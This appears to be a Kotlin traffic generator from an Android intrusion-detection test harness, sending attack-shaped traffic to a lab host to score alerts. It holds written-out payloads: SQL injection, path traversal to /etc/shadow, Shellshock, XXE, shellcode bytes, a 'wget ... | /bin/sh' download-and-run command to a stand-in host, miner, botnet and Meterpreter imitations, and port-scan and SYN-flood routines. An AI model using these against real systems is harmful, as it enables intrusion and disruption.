package com.andronet.eval

import java.io.File
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import java.nio.channels.SelectionKey
import java.nio.channels.Selector
import java.nio.channels.SocketChannel
import kotlin.random.Random

/**
 * Attack-shaped traffic generated on the phone, so that it crosses the real capture path.
 * Runs under app_process as the shell user, whose traffic a VpnService routes like any app's.
 * Every destination is the lab host passed on the command line. Writes one
 * "name start_ms end_ms" line per scenario, which scoring uses to attribute alerts.
 */
object LiveGen {
    private const val HTTP = 18080
    private val BROWSER = "Mozilla/5.0 (Linux; Android 17; Pixel 8) AppleWebKit/537.36 Chrome/140.0 Mobile Safari/537.36"
    private val rng = Random(20261102)

    private fun http(host: String, method: String, path: String, ua: String = BROWSER, body: ByteArray? = null) {
        try {
            Socket().use { s ->
                s.soTimeout = 3000
                s.connect(InetSocketAddress(host, HTTP), 3000)
                val head = StringBuilder("$method $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nAccept: */*\r\n")
                if (body != null) head.append("Content-Type: application/octet-stream\r\nContent-Length: ${body.size}\r\n")
                head.append("Connection: close\r\n\r\n")
                val out = s.getOutputStream()
                out.write(head.toString().toByteArray(Charsets.ISO_8859_1))
                out.flush()
                if (body != null) {
                    out.write(body)
                    out.flush()
                }
                val buf = ByteArray(8192)
                val input = s.getInputStream()
                while (input.read(buf) > 0) { /* drain */ }
            }
        } catch (e: Exception) {
            System.err.println("http $path: ${e.message}")
        }
        Thread.sleep(50)
    }

    private fun talk(host: String, port: Int, lines: List<ByteArray>, gapMs: Long = 150) {
        try {
            Socket().use { s ->
                s.soTimeout = 500
                s.connect(InetSocketAddress(host, port), 3000)
                val out = s.getOutputStream()
                for (line in lines) {
                    out.write(line)
                    out.flush()
                    Thread.sleep(gapMs)
                    try { s.getInputStream().read(ByteArray(1024)) } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            System.err.println("talk $port: ${e.message}")
        }
    }

    /** Non-blocking connects, so that an unanswered SYN costs no thread and no wait. */
    private fun connectStorm(host: String, ports: List<Int>, perSecond: Int, holdMs: Long) {
        val selector = Selector.open()
        val channels = ArrayList<SocketChannel>()
        val address = InetAddress.getByName(host)
        val gapNanos = 1_000_000_000L / perSecond
        var next = System.nanoTime()
        for (port in ports) {
            try {
                val c = SocketChannel.open()
                c.configureBlocking(false)
                c.connect(InetSocketAddress(address, port))
                c.register(selector, SelectionKey.OP_CONNECT)
                channels.add(c)
            } catch (_: Exception) {
            }
            next += gapNanos
            val wait = next - System.nanoTime()
            if (wait > 0) Thread.sleep(wait / 1_000_000, (wait % 1_000_000).toInt())
            while (channels.size > 400) {
                try { channels.removeAt(0).close() } catch (_: Exception) {}
            }
        }
        Thread.sleep(holdMs)
        for (c in channels) try { c.close() } catch (_: Exception) {}
        selector.close()
    }

    private fun dnsQuery(host: InetAddress, sock: DatagramSocket, name: String, qtype: Int) {
        val out = java.io.ByteArrayOutputStream()
        val id = rng.nextInt(65536)
        out.write(byteArrayOf((id shr 8).toByte(), id.toByte(), 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0))
        for (label in name.split('.')) {
            out.write(label.length)
            out.write(label.toByteArray())
        }
        out.write(0)
        out.write(byteArrayOf(0, qtype.toByte(), 0, 1))
        val bytes = out.toByteArray()
        sock.send(DatagramPacket(bytes, bytes.size, host, 53))
    }

    private fun hex(n: Int) = rng.nextBytes(n).joinToString("") { "%02x".format(it) }

    private fun base32(n: Int): String {
        val alphabet = "abcdefghijklmnopqrstuvwxyz234567"
        return (0 until n).map { alphabet[rng.nextInt(32)] }.joinToString("")
    }

    private fun scenarios(host: String): Map<String, () -> Unit> = linkedMapOf(
        "port_scan_connect" to { connectStorm(host, (1..300).toList(), 120, 1500) },
        "syn_flood" to { connectStorm(host, List(900) { 9 }, 180, 1500) },
        "http_sqli" to {
            http(host, "GET", "/item.php?id=1%20UNION%20SELECT%201,2,3--")
            http(host, "GET", "/item.php?id=1%27%20OR%20%271%27%3D%271")
            http(host, "POST", "/login", body = "user=admin&pass=' OR '1'='1".toByteArray())
        },
        "http_traversal" to {
            http(host, "GET", "/download?f=..%2F..%2F..%2Fetc%2Fpasswd")
            http(host, "GET", "/download?f=../../../etc/shadow")
        },
        "http_scanner_sqlmap_ua" to { http(host, "GET", "/item.php?id=1", ua = "sqlmap/1.9#stable (https://sqlmap.org)") },
        "http_scanner_nikto_ua" to { http(host, "GET", "/admin/", ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)") },
        "http_scanner_nmap_ua" to { http(host, "GET", "/", ua = "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)") },
        "http_shellshock" to { http(host, "GET", "/cgi-bin/status", ua = "() { :;}; /bin/bash -c 'id'") },
        "http_rce" to { http(host, "POST", "/cgi-bin/run", body = "cmd=; wget http://198.51.100.9/x.sh -O- | /bin/sh".toByteArray()) },
        "http_xxe" to {
            http(host, "POST", "/xml", body = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>".toByteArray())
        },
        "http_download" to { http(host, "GET", "/updates/invoice.exe"); http(host, "GET", "/updates/patch.apk") },
        "http_cobalt_beacon" to {
            repeat(3) {
                http(host, "GET", "/activity", ua = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)")
                Thread.sleep(1500)
            }
        },
        "http_exfil" to {
            val blob = rng.nextBytes(1300)
            Socket().use { s ->
                s.connect(InetSocketAddress(host, HTTP), 3000)
                val out = s.getOutputStream()
                val token = java.util.Base64.getUrlEncoder().encodeToString(rng.nextBytes(96))
                out.write("POST /collect?data=$token HTTP/1.1\r\nHost: $host\r\nUser-Agent: $BROWSER\r\nContent-Length: ${blob.size * 900}\r\n\r\n".toByteArray())
                repeat(900) {
                    out.write(blob)
                    out.flush()
                    Thread.sleep(8)
                }
            }
        },
        "dns_tunnel_fast" to {
            val dst = InetAddress.getByName(host)
            DatagramSocket().use { sock ->
                repeat(300) { i ->
                    val name = if (i % 2 == 0) "${hex(24)}.t.tunnel-lab.example" else "${base32(40)}.${base32(20)}.t.tunnel-lab.example"
                    dnsQuery(dst, sock, name, 16)
                    Thread.sleep(40)
                }
            }
        },
        "dns_tunnel_slow" to {
            val dst = InetAddress.getByName(host)
            DatagramSocket().use { sock ->
                repeat(12) {
                    dnsQuery(dst, sock, "${hex(24)}.t.tunnel-lab.example", 16)
                    Thread.sleep(2000)
                }
            }
        },
        "stratum_btc" to {
            talk(host, 3333, listOf(
                "{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"cgminer/4.10.0\"]}\n".toByteArray(),
                "{\"id\":2,\"method\":\"mining.authorize\",\"params\":[\"wallet.w1\",\"x\"]}\n".toByteArray()
            ))
        },
        "stratum_xmrig" to {
            talk(host, 3333, listOf(
                "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"44AFFq\",\"pass\":\"x\",\"agent\":\"XMRig/6.21.0\",\"algo\":[\"rx/0\"]}}\n".toByteArray()
            ))
        },
        "irc_bot" to {
            talk(host, 6667, listOf("NICK bot1\r\nUSER b 0 * :b\r\n".toByteArray(), "JOIN #cmd\r\n".toByteArray(), "PRIVMSG #cmd :!ready\r\n".toByteArray()))
        },
        "meterpreter" to {
            talk(host, 4444, listOf("\u0000\u0000core_loadlib ext_server_stdapi\n".toByteArray(), "\u0000\u0000stdapi_sys_config_getuid\n".toByteArray()))
        },
        "ssh_tool_banner" to { talk(host, 22, listOf("SSH-2.0-libssh_0.9.6\r\n".toByteArray())) },
        "ssh_bruteforce" to {
            repeat(16) {
                talk(host, 22, listOf("SSH-2.0-OpenSSH_9.6\r\n".toByteArray()), gapMs = 60)
            }
        },
        "shellcode" to {
            http(host, "POST", "/vuln.cgi", body = ByteArray(64) { 0x90.toByte() } + byteArrayOf(0x31, 0xC0.toByte(), 0x50, 0x68, 0x2F, 0x2F, 0x73, 0x68))
        }
    )

    fun run(host: String, only: String?, outPath: String, settleMs: Long) {
        val all = scenarios(host)
        val chosen = if (only.isNullOrEmpty()) all.keys.toList() else only.split(",")
        File(outPath).printWriter().use { log ->
            for (name in chosen) {
                val body = all[name] ?: error("unknown scenario $name")
                val start = System.currentTimeMillis()
                try {
                    body()
                } catch (e: Exception) {
                    System.err.println("$name failed: ${e.message}")
                }
                val end = System.currentTimeMillis()
                log.println("$name $start $end")
                log.flush()
                println("$name ${end - start} ms")
                // A gap long enough for the 10 s aggregation window, so one scenario's alert
                // cannot be swallowed by the previous scenario's
                Thread.sleep(settleMs)
            }
        }
    }

    /** Timed transfer through whatever capture is active: returns Mbit/s. */
    fun transfer(host: String, direction: String, bytes: Long): Double {
        val buf = ByteArray(64 * 1024)
        val start: Long
        if (direction == "down") {
            Socket().use { s ->
                s.receiveBufferSize = 4 * 1024 * 1024
                s.connect(InetSocketAddress(host, 18081), 5000)
                s.soTimeout = 15000
                s.getOutputStream().write("$bytes 0\n".toByteArray())
                start = System.nanoTime()
                val input = s.getInputStream()
                var got = 0L
                while (got < bytes) {
                    val n = input.read(buf)
                    if (n <= 0) break
                    got += n
                }
                val secs = (System.nanoTime() - start) / 1e9
                return got * 8 / secs / 1e6
            }
        } else {
            Socket().use { s ->
                s.sendBufferSize = 4 * 1024 * 1024
                s.connect(InetSocketAddress(host, 18082), 5000)
                start = System.nanoTime()
                val out = s.getOutputStream()
                var sent = 0L
                while (sent < bytes) {
                    val n = minOf(buf.size.toLong(), bytes - sent).toInt()
                    out.write(buf, 0, n)
                    sent += n
                }
                out.flush()
            }
            val secs = (System.nanoTime() - start) / 1e9
            return bytes * 8 / secs / 1e6
        }
    }

    /** TCP connect time through the active capture, in milliseconds. */
    fun connectRtt(host: String, samples: Int): List<Double> = (0 until samples).map {
        val t0 = System.nanoTime()
        Socket().use { s -> s.connect(InetSocketAddress(host, 18080), 5000) }
        val ms = (System.nanoTime() - t0) / 1e6
        Thread.sleep(100)
        ms
    }
}
